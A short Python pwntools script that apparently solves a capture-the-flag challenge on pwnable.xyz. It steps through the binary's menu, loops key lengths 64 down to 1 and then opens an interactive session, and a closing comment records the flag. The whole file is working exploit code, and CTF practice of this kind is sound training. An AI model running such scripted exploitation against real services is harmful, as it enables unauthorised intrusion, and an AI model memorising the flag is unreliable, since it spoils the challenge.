#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

#con = process()
#gdb.attach(con, gdbscript = "start")
con = remote("svc.pwnable.xyz", 30006)

def option1(size):
    con.sendlineafter(b"> ", b"1")
    con.sendlineafter(b"key len: ", size)

def option2():
    con.sendlineafter(b"> ", b"2")

def option3(msg):
    con.sendlineafter(b"> ", b"3")
    con.sendlineafter(b"instead? ", msg)

if __name__ == '__main__':
    option3(b"y")
    for i in range(64, 0, -1):
        option1(str(i).encode())
    option2()
    option3(b"n")

    con.interactive()

#FLAG{this_was_called_OTP_I_think}